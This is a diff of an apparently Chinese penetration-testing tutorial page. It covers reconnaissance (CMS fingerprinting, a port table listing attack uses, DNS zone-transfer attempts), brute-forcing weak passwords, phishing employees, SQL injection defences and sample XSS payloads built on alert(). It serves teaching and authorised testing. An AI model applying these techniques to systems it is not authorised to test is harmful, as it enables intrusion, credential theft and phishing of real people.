 <li>使用nc 或telnet 可以观察数据包特征或者网页加载的特殊文件来识别cms，如<code>nc xxx.com 80</code></li>
@@ -1176,11 +1159,11 @@ function showBtn(){
 <li>HTTP 标头 ，如 X-Powered-By 字段</li>
 <li>cookie </li>
 <li>HTML 源代码</li>
-<li>特定文件和文件夹，例如/templets/default/style/dedecms.css — dedecms</li>
+<li>特定文件和文件夹，例如&#x2F;templets&#x2F;default&#x2F;style&#x2F;dedecms.css — dedecms</li>
 <li>网站独有文件的md5，例如favicon.ico</li>
-<li>网站命名规则；返回头的关键字；网页关键字；URL特征；Meta特征；Script特征；robots.txt；网站路径特征；网站静态资源；爬取网站目录信息等<br>是否用了某种开源程序cms，然后我们可以利用公开的对应版本的poc、默认的后台登录页/数据库服务端口认证等进行测试，当然我们也可以将对应版本的源码下载下来进行代码审计。<br><br>用什么框架开发的，如Thinkphp、struts2，很多网站都利用开源的框架来快速开发网站，所以收集网站的框架信息也是非常关键的。 <figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">开源的软件</span><br><span class="line"></span><br><span class="line">常见的开源软件有：wordpress、phpbb、dedecms等</span><br><span class="line">开源的框架</span><br><span class="line"></span><br><span class="line">常见的开源框架有：Struts2、 Spring MVC、ThinkPHP等</span><br><span class="line">中间件服务器</span><br><span class="line"></span><br><span class="line">常见的中间件服务器有：<span class="keyword">jboss、tomcat、Weblogic等</span></span><br><span class="line"><span class="keyword"></span>数据库服务</span><br><span class="line"></span><br><span class="line">常见的数据库服务：mssql、mysql、<span class="keyword">oracle、redis、sybase、MongoDB、DB2等 </span></span><br></pre></td></tr></table></figure></li>
+<li>网站命名规则；返回头的关键字；网页关键字；URL特征；Meta特征；Script特征；robots.txt；网站路径特征；网站静态资源；爬取网站目录信息等<br>  是否用了某种开源程序cms，然后我们可以利用公开的对应版本的poc、默认的后台登录页&#x2F;数据库服务端口认证等进行测试，当然我们也可以将对应版本的源码下载下来进行代码审计。<br><br>  用什么框架开发的，如Thinkphp、struts2，很多网站都利用开源的框架来快速开发网站，所以收集网站的框架信息也是非常关键的。</li>
 </ul>
-</li>
+  <figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">开源的软件</span><br><span class="line"></span><br><span class="line">常见的开源软件有：wordpress、phpbb、dedecms等</span><br><span class="line">开源的框架</span><br><span class="line"></span><br><span class="line">常见的开源框架有：Struts2、 Spring MVC、ThinkPHP等</span><br><span class="line">中间件服务器</span><br><span class="line"></span><br><span class="line">常见的中间件服务器有：<span class="keyword">jboss、tomcat、Weblogic等</span></span><br><span class="line"><span class="keyword"></span>数据库服务</span><br><span class="line"></span><br><span class="line">常见的数据库服务：mssql、mysql、<span class="keyword">oracle、redis、sybase、MongoDB、DB2等 </span></span><br></pre></td></tr></table></figure></li>
 </ul>
 <p>  是否使用负载均衡，负载均衡是通过在多个服务器中分割WEB流量，来确保单个服务器的请求不会超载，一般不可见，但是有可能极大的改变渗透测试的进程。当发出请求的时候，负载均衡可能将请求交给其中的一个服务器来处理。每个服务器的应用结构虽然相同，但是文件夹不同、补丁级别不同及其他配置可能完全不同</p>
 <ul>
@@ -1206,8 +1189,8 @@ function showBtn(){
 <li><p>利用app进行信息收集</p>
 <p>  可以利用工具对其进行逆向，找出其所使用的url链接，然后进行专门的渗透测试</p>
 </li>
-<li><p>敏感目录/文件</p>
-<p>  敏感目录包括但不限于网站的敏感文件（.mdb,.excel,.word,.zip,.rar），各类web入口（后台、控制台弱口令、爆破）、未授权访问的上传页面，文本编辑器、robots.txt、.git文件泄露，.svn文件泄露，.DB_store文件泄露，WEB-INF/web.xml泄露或者phpmyadmin等等目录。<br>就拿备份文件来讲，一般人拿到以后只会查看是否有数据库账号密码进行连接，如果没有就无从下手,其实我们可以通过代码审计发现它的漏洞进行渗透测试。再比如phpmyadmin，我们可以使用爆破工具对其账号密码进行爆破。或者是之前有黑阔留下的后门文件，我们也可以爆破其密码进行利用。<br>目录扫描有两种方式，使用目录字典进行暴力才接存在该目录或文件返回200或者403；使用爬虫爬行主页上的所有链接，对每个链接进行再次爬行，收集这个域名下的所有链接，然后总结出需要的信息。常用工具<a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch">dirsearch</a>、御剑、wwwscan、<a target="_blank" rel="noopener" href="https://github.com/lijiejie/BBScan">BBscan</a>、爬虫等发现或爆破发现隐藏页面，增加攻击面</p>
+<li><p>敏感目录&#x2F;文件</p>
+<p>  敏感目录包括但不限于网站的敏感文件（.mdb,.excel,.word,.zip,.rar），各类web入口（后台、控制台弱口令、爆破）、未授权访问的上传页面，文本编辑器、robots.txt、.git文件泄露，.svn文件泄露，.DB_store文件泄露，WEB-INF&#x2F;web.xml泄露或者phpmyadmin等等目录。<br>就拿备份文件来讲，一般人拿到以后只会查看是否有数据库账号密码进行连接，如果没有就无从下手,其实我们可以通过代码审计发现它的漏洞进行渗透测试。再比如phpmyadmin，我们可以使用爆破工具对其账号密码进行爆破。或者是之前有黑阔留下的后门文件，我们也可以爆破其密码进行利用。<br>目录扫描有两种方式，使用目录字典进行暴力才接存在该目录或文件返回200或者403；使用爬虫爬行主页上的所有链接，对每个链接进行再次爬行，收集这个域名下的所有链接，然后总结出需要的信息。常用工具<a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch">dirsearch</a>、御剑、wwwscan、<a target="_blank" rel="noopener" href="https://github.com/lijiejie/BBScan">BBscan</a>、爬虫等发现或爆破发现隐藏页面，增加攻击面</p>
 </li>
 <li><p>端口信息</p>
 <p>  服务和安全是相对应的，每开启一个端口，那么攻击面就大了一点，开启的端口越多，也就意味着服务器面临的威胁越大，如服务配置错误、服务自身漏洞利用、弱口令等。当拿到一个ip的时候，我们一般都需要使用nmap或者其他同类扫描工具如masscan对其开放端口以及端口对应的服务和版本信息进行扫描。通过端口开放情况，我们可以针对性的对其进行渗透测试</p>
@@ -1215,7 +1198,7 @@ function showBtn(){
 <p>  关键的操作就是确定端口后边的软件及软件版本，然后去个漏洞库去查找其存在的漏洞乃至exp<br>  搜索漏洞信息</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="http://www.cvedetails.com/version-search.php">CVE漏洞库搜索</a></li>
-<li><a target="_blank" rel="noopener" href="http://cve.mitre.org/cve/search_cve_list.html">mitre_cve漏洞信息搜索</a><br>通过cve获取exp</li>
+<li><a target="_blank" rel="noopener" href="http://cve.mitre.org/cve/search_cve_list.html">mitre_cve漏洞信息搜索</a><br>  通过cve获取exp</li>
 <li>通过metasploit搜索<code>msf&gt; search cve:2018-xxxx</code></li>
 <li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/search/">exploit-db</a></li>
 <li>github搜索</li>
@@ -1227,7 +1210,7 @@ function showBtn(){
 <thead>
 <tr>
 <th>端口号</th>
-<th>端口服务/协议简要说明</th>
+<th>端口服务&#x2F;协议简要说明</th>
 <th>关于端口可能的一些渗透用途</th>
 </tr>
 </thead>
@@ -1249,15 +1232,15 @@ function showBtn(){
 <tr>
 <td>tcp 25</td>
 <td>smtp[简单邮件传输协议,多数linux发行版可能会默认开启此服务]</td>
-<td>邮件伪造,vrfy/expn 查询邮件用户信息,可使用smtp-user-enum工具来自动跑</td>
+<td>邮件伪造,vrfy&#x2F;expn 查询邮件用户信息,可使用smtp-user-enum工具来自动跑</td>
 </tr>
 <tr>
-<td>tcp/udp 53</td>
+<td>tcp&#x2F;udp 53</td>
 <td>dns[域名解析]</td>
 <td>允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控</td>
 </tr>
 <tr>
-<td>tcp/udp 69</td>
+<td>tcp&#x2F;udp 69</td>
 <td>tftp[简单文件传输协议,无认证]</td>
 <td>尝试下载目标及其的各类重要配置文件</td>
 </tr>
@@ -1383,7 +1366,7 @@ function showBtn(){
 </tr>
 <tr>
 <td>tcp 5000</td>
-<td>sybase/DB2数据库</td>
+<td>sybase&#x2F;DB2数据库</td>
 <td>爆破,注入</td>
 </tr>
 <tr>
@@ -1444,7 +1427,7 @@ function showBtn(){
 <tr>
 <td>tcp 9080-9081,9090</td>
 <td>websphere控制台</td>
-<td>java反序列化/弱口令</td>
+<td>java反序列化&#x2F;弱口令</td>
 </tr>
 <tr>
 <td>tcp 9200,9300</td>
@@ -1484,7 +1467,7 @@ function showBtn(){
 </tbody></table>
 <ul>
 <li><p>子域名信息收集</p>
-<p>  在渗透测试的时候，往往主站的防御会很强，常常无从下手，那么子站就是一个重要的突破口，因为一个企业可能对子域名的安全不是很重视，甚至有些子域名只是内测阶段还没有上线，因此子域名是渗透测试的主要关注对象，子域名搜集的越完整，那么挖到的漏洞就可能更多，甚至漏洞的级别也会更高。常用工具暴力枚举<a target="_blank" rel="noopener" href="https://github.com/lijiejie/subDomainsBrute">subDomainsBrute</a>、子域名挖掘机Layer、DNS域传送漏洞、https证书日志、DNS解析记录、搜索引擎（baidu/google）、IP反查、主站爬取、shodan/fofa/zoomeye等</p>
+<p>  在渗透测试的时候，往往主站的防御会很强，常常无从下手，那么子站就是一个重要的突破口，因为一个企业可能对子域名的安全不是很重视，甚至有些子域名只是内测阶段还没有上线，因此子域名是渗透测试的主要关注对象，子域名搜集的越完整，那么挖到的漏洞就可能更多，甚至漏洞的级别也会更高。常用工具暴力枚举<a target="_blank" rel="noopener" href="https://github.com/lijiejie/subDomainsBrute">subDomainsBrute</a>、子域名挖掘机Layer、DNS域传送漏洞、https证书日志、DNS解析记录、搜索引擎（baidu&#x2F;google）、IP反查、主站爬取、shodan&#x2F;fofa&#x2F;zoomeye等</p>
 <p>  <strong>有许多第三方服务聚合了大量的DNS数据集，并通过它们来检索给定域名的子域名</strong></p>
 <p>  VirusTotal：<a target="_blank" rel="noopener" href="https://www.virustotal.com/#/home/search">https://www.virustotal.com/#/home/search</a> </p>
 <p>  DNSdumpster：<a target="_blank" rel="noopener" href="https://dnsdumpster.com/">https://dnsdumpster.com/</a> </p>
@@ -1497,10 +1480,11 @@ function showBtn(){
 <p>  区域传送：允许第三主服务器的数据刷新自己的区域数据库，防止主域名服务器因意外故障变得不可用时影响到这个网络。 区域传送配置错误：只要有人发出请求，就会提供一个区域数据库的拷贝，把内部主机名和ip地址暴露出来</p>
 <p>  首先,应该去查下目标的ns服务器是否允许区域传送,如果允许,直接把目标的整个子域备份过来即可，可以使用 <strong>dig</strong>（可以从该域名的官方DNS服务器上查询到精确的权威解答）或 <strong>nslookup</strong>（得到DNS解析服务器保存在Cache中的非权威解答）</p>
 <ul>
-<li>查出目标自己所有的ns记录,然后挨个尝试目标ns服务器是否允许传送（务必是目标自己的ns服务器,第三方的不算）<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">dig</span> +short @<span class="number">8.8</span>.<span class="number">8.8</span> xx.<span class="keyword">cn</span> ns</span><br><span class="line">dns.xx.<span class="keyword">cn</span>.</span><br><span class="line">dns1.xx.<span class="keyword">cn</span>.</span><br></pre></td></tr></table></figure>
-通过上面的查询,我们确定了目标自己的三个ns服务器,下面就开始来尝试逐个传送,这里还是要注意,必须用目标自己的ns服务器来解析它自己的子域</li>
+<li>查出目标自己所有的ns记录,然后挨个尝试目标ns服务器是否允许传送（务必是目标自己的ns服务器,第三方的不算）</li>
 </ul>
-  <figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># dig <span class="keyword">@dns</span>.xx.cn xx.cn axfr</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9<span class="selector-class">.11</span><span class="selector-class">.3-1ubuntu1</span><span class="selector-class">.1-Ubuntu</span> &lt;&lt;&gt;&gt; <span class="keyword">@dns</span>.xx.cn xx.cn axfr</span><br><span class="line">; (<span class="number">1</span> server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">; Transfer failed.</span><br><span class="line"></span><br><span class="line"># dig <span class="keyword">@dns</span>1.xx.cn xx.cn axfr</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9<span class="selector-class">.11</span><span class="selector-class">.3-1ubuntu1</span><span class="selector-class">.1-Ubuntu</span> &lt;&lt;&gt;&gt; <span class="keyword">@dns</span>1.xx.cn xx.cn axfr</span><br><span class="line">; (<span class="number">1</span> server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">; Transfer failed.</span><br></pre></td></tr></table></figure>
+  <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">dig</span> +short @<span class="number">8.8</span>.<span class="number">8.8</span> xx.<span class="keyword">cn</span> ns</span><br><span class="line">dns.xx.<span class="keyword">cn</span>.</span><br><span class="line">dns1.xx.<span class="keyword">cn</span>.</span><br></pre></td></tr></table></figure>
+<p>  通过上面的查询,我们确定了目标自己的三个ns服务器,下面就开始来尝试逐个传送,这里还是要注意,必须用目标自己的ns服务器来解析它自己的子域</p>
+  <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dig @dns.xx.cn xx.cn axfr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.1-Ubuntu &lt;&lt;&gt;&gt; @dns.xx.cn xx.cn axfr</span></span><br><span class="line"><span class="comment">; (1 server found)</span></span><br><span class="line"><span class="comment">;; global options: +cmd</span></span><br><span class="line"><span class="comment">; Transfer failed.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dig @dns1.xx.cn xx.cn axfr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.1-Ubuntu &lt;&lt;&gt;&gt; @dns1.xx.cn xx.cn axfr</span></span><br><span class="line"><span class="comment">; (1 server found)</span></span><br><span class="line"><span class="comment">;; global options: +cmd</span></span><br><span class="line"><span class="comment">; Transfer failed.</span></span><br></pre></td></tr></table></figure>
 
 <p>  很显然,上面的这些ns服务器都不允许传送,如果目标ns服务器实在不允许传送,从其他的各种记录中获取子域,如,mx记录,spf记录,srv记录…</p>
 </li>
@@ -1508,7 +1492,7 @@ function showBtn(){
 <p>  通过域名MX记录查看是否为自建邮件服务器，自建的情况下可以后续测试漏洞，通过TheHarvester可以进行邮箱挖掘，没有找到漏洞也可以进行钓鱼</p>
 </li>
 <li><p>了解网站业务功能</p>
-<p>  我们需要对整个站点的整体功能有所了解，从注册用户到更改信息更改密码等等，所有的功能都需要尽可能体验一遍，在体验的同时就应该思考这个功能可能产生什么样的漏洞，比如：登陆/留言/下单/退出/退货/付款等。并且需要多注册几个账号，这对后面的csrf漏洞发现或者逻辑漏洞发现等等都很有帮助</p>
+<p>  我们需要对整个站点的整体功能有所了解，从注册用户到更改信息更改密码等等，所有的功能都需要尽可能体验一遍，在体验的同时就应该思考这个功能可能产生什么样的漏洞，比如：登陆&#x2F;留言&#x2F;下单&#x2F;退出&#x2F;退货&#x2F;付款等。并且需要多注册几个账号，这对后面的csrf漏洞发现或者逻辑漏洞发现等等都很有帮助</p>
 </li>
 <li><p>了解网站目录的结构</p>
 <p>  在开始安全测试之前, 了解应用程序的结构是至关重要的。如果不彻底了解应用程序的布局, 就不可能对其进行彻底的测试。可以通过burpsuite自动化爬虫，</p>
@@ -1518,7 +1502,7 @@ function showBtn(){
 <p>  通过说明文档以及网站页面收集，或者网站发表者以及留言板信息处收集账号</p>
 <p>  通过 teemo，metago，burpusit，awvs，netspker 或者 google 语法收集</p>
 <p>  搜索相关 QQ 群收集相关企业员工的社交账号</p>
-<p>  拿着姓名/手机/邮箱等到各网站搜一圈看注册信息</p>
+<p>  拿着姓名&#x2F;手机&#x2F;邮箱等到各网站搜一圈看注册信息</p>
 <p>  拿到员工的信息，我们可以尝试使用弱密码进行登录一些内部平台，并且一些员工的邮箱的前缀很可能就是他的密码。当然，如果说当一个服务不允许多次使用错误密码登录，我们可以先确定弱口令，然后爆破收集到的账号信息去爆破哪些用户使用这个弱口令从而绕过这个防护机制。</p>
 <p>  可以尝试给对方邮箱发送钓鱼邮件或木马</p>
 <p>  UitraISO+Hacksaw制作木马启动盘</p>
@@ -1538,14 +1522,12 @@ function showBtn(){
 <p>根据已搜集的信息进行梳理与分析，查找疏漏点进行搜集补充，从各个角度都整理一套渗透攻击步骤与思路的规划，优先以最擅长和最有把握的方面切入</p>
 <h2 id="0x03-漏洞发现"><a href="#0x03-漏洞发现" class="headerlink" title="0x03 漏洞发现"></a>0x03 漏洞发现</h2><ul>
 <li><p>漏洞扫描</p>
-<p>  关于漏洞扫描的工具太多了，一般使用awvs/newwus扫描，其他辅助工具 Nmap、msf、searchsploit(exlpoitdb)、burp、firefox插件等</p>
-<p>  但是不要依赖工具，很多漏洞工具都是扫不出的，一定要结合手工测试漏洞，需要靠平时的积累学习，且扫描器扫描会插入很多脏数据（数据库/日志等）对网站数据和服务造成破坏。</p>
-<p>  拿到环境和不同权限的测试账号后，和业务方沟通业务逻辑，先熟悉一下网站的基本功能和结构，注册/登陆/各个功能模块，从系统漏洞/中间件漏洞/web漏洞</p>
+<p>  关于漏洞扫描的工具太多了，一般使用awvs&#x2F;newwus扫描，其他辅助工具 Nmap、msf、searchsploit(exlpoitdb)、burp、firefox插件等</p>
+<p>  但是不要依赖工具，很多漏洞工具都是扫不出的，一定要结合手工测试漏洞，需要靠平时的积累学习，且扫描器扫描会插入很多脏数据（数据库&#x2F;日志等）对网站数据和服务造成破坏。</p>
+<p>  拿到环境和不同权限的测试账号后，和业务方沟通业务逻辑，先熟悉一下网站的基本功能和结构，注册&#x2F;登陆&#x2F;各个功能模块，从系统漏洞&#x2F;中间件漏洞&#x2F;web漏洞</p>
 </li>
-</ul>
-<ul>
 <li><p>sql注入</p>
-<p>  <strong>定义</strong>：Web程序代码中对于用户提交的参数未做过滤就直接放到SQL语句中执行，导致参数中的特殊字符打破了SQL语句原有逻辑，黑客可以利用该漏洞执行任意SQL语句。<br><br>  掌握常用的sql注入手法，熟练使用sqlmap或者同类工具。还需要学会剑走偏锋，多去探索冷门的sql注入方法，这样才不会被过滤了某些字符的时候而束手无策。<br><br>  **其次作为白帽子要有自己的原则和底线，即使数据再诱人，也千万不要去拿任何数据!**，还需要注意的是如后端语句使用了<code>insert</code>可能一个简单的逻辑判断都能把整个表给篡改了，要注意备份<br><br>  <strong>何防止SQL注入：</strong><br></p>
+<p>  <strong>定义</strong>：Web程序代码中对于用户提交的参数未做过滤就直接放到SQL语句中执行，导致参数中的特殊字符打破了SQL语句原有逻辑，黑客可以利用该漏洞执行任意SQL语句。<br><br>  掌握常用的sql注入手法，熟练使用sqlmap或者同类工具。还需要学会剑走偏锋，多去探索冷门的sql注入方法，这样才不会被过滤了某些字符的时候而束手无策。<br><br>  <strong>其次作为白帽子要有自己的原则和底线，即使数据再诱人，也千万不要去拿任何数据!</strong>，还需要注意的是如后端语句使用了<code>insert</code>可能一个简单的逻辑判断都能把整个表给篡改了，要注意备份<br><br>  <strong>何防止SQL注入：</strong><br></p>
 <ul>
 <li>不信任用户的输入；</li>
 <li>不使用动态拼接sql，可使用参数化的sql或直接使用存储过程进行数据查询存取；</li>
@@ -1564,15 +1546,17 @@ function showBtn(){
 <p>  <strong>XSS可能发生的场景</strong></p>
 <ol>
 <li><p>在HTML标签中输出</p>
- <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>$var<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> &gt;</span>$var<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--在这种场景下，XSS的利用方式一般是构造一个&lt;script&gt;标签，或者是任何能够产生脚本执行的方式。--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> &gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+ <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>$var<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> &gt;</span>$var<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--在这种场景下，XSS的利用方式一般是构造一个&lt;script&gt;标签，或者是任何能够产生脚本执行的方式。--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> &gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
 <li><p>在HTML属性中输出</p>
- <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;abc&quot;</span> <span class="attr">name</span>=<span class="string">&quot;$var&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--灵活构造XSS PAYLOAD--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;abc&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;&quot;&quot; &gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+ <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;abc&quot;</span> <span class="attr">name</span>=<span class="string">&quot;$var&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--灵活构造XSS PAYLOAD--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;abc&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;&quot;&quot; &gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
 <li><p>在<code>&lt;script&gt;</code>标签中输出 </p>
- <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> x = <span class="string">&quot;$var&quot;</span>;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--攻击者需要先闭合引号才能实施XSS攻击--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> x = <span class="string">&quot;&quot;</span>;alert(<span class="regexp">/xss/</span>);<span class="comment">//&quot;;</span></span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+ <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> x = <span class="string">&quot;$var&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--攻击者需要先闭合引号才能实施XSS攻击--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> x = <span class="string">&quot;&quot;</span>;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>);<span class="comment">//&quot;;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
 <li><p>在事件中输出</p>
  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">&quot;funcA(&#x27;$var&#x27;)&quot;</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--可能的攻击方法--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">&quot;funcA(&#x27;&#x27;);alert(/xss/);  //&#x27;)&quot;</span>     &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
 <li><p>在CSS中输出</p>
- <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">$&#123;xss&#125;</span>);&#125;</span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">expression</span>($&#123;xss&#125;);&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">在CSS中输出同样存在XSS的风险，如：</span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;</span>)<span class="string">&quot;);&#125;</span></span><br><span class="line"><span class="string">body &#123;background-image:expression(alert(/xss/));&#125;</span></span><br></pre></td></tr></table></figure></li>
